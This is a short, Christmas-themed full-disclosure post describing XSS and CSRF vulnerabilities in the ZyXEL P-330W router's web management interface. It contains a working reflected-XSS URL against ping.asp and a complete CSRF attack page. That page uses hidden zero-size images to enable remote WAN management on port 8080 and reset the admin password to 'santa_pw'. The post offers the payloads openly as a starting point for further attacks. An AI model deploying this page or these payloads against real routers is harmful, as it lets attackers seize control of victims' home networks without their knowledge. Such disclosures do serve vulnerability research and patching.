# Ho Ho H0-Day - ZyXEL P-330W multiple XSS and XSRF vulnerabilities

ZyXEL P-330W “Secure Wireless Internet Sharing Router” is
vulnerable to multiple XSS and XSRF attacks.

There are a plethora of XSS vulns in the web-based management
interface so I'll leave it to you to discover these gifts on your
own.  Here is a starting point:

http://<router_ip>:<router_port>/ping.asp?pingstr=”><script>alert("M
erry Christams")</script>

Additionally, no measures are taken to prevent XSRF so pretty much
the whole web-based interface is vulnerable.  Here is an example of
a web page that if loaded by the victim, turns on remote router
management on port 8080 and changes the admin password to
"santa_pw":

<html><head><title>Chirstmastime is Here</title></head><body>
<img
src="http://<router_ip>:<router_port>/goform/formRmtMgt?webWanAccess
=ON&remoteMgtPort=80
80&pingWANEnabled=&upnpEnabled=&WANPassThru1=&WANPassThru2=&WANPassT
hru3=&
submit-url=%2Fremotemgt.asp" width="0" height="0">
<img
src="http://<router_ip>:<router_port>/goform/formPasswordSetup?usern
ame=admin&newpass=santa_pw
&confpass=santa_pw&submit-url=%2Fstatus.asp&save=Save" width="0"
height="0">
</body>
</html>

Of course, for any of these attacks to be successful the victim has
to be recently logged in to the router.

Hope everyone has a Merry Christmas and please don't think Santa is
a lamer because he posted XSS and XSRF (hey, I've been busy
delivering toys all night and needed a little pick-me-up).

Merry XSSmas, peace on earth, and this year, give the gift of input
validation.
